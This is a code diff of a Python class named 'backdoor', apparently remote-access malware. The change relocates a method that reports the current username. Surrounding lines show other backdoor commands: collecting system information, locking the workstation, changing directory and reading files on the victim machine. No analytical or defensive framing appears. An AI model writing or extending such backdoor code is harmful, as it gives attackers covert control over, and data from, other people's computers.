@@ -151,6 +151,13 @@ class backdoor:
         except Exception as e:
             return "[-] Could'nt get System Information: {}.".format(e)
 
+    def get_current_user(self):
+        try:
+            user = os.getlogin()            
+            return "[+] Current user: {}".format(user)
+        except Exception as e:
+            return "[-] Couldn't get the username: {}".format(e)
+
     def lock_system(self):
         try:
             ctypes.windll.user32.LockWorkStation()
@@ -215,13 +222,6 @@ class backdoor:
             return "[+] Changing working directory to: {}.".format(os.getcwd())
         except Exception as e:
             return "[-] Error changing directory to: {}, {}.".format(path, e)
-
-    def get_current_user(self):
-        try:
-            user = os.getlogin()            
-            return "[+] Current user: {}".format(user)
-        except Exception as e:
-            return "[-] Couldn't get the username: {}".format(e)
 
     def read_file(self, path):
         try:
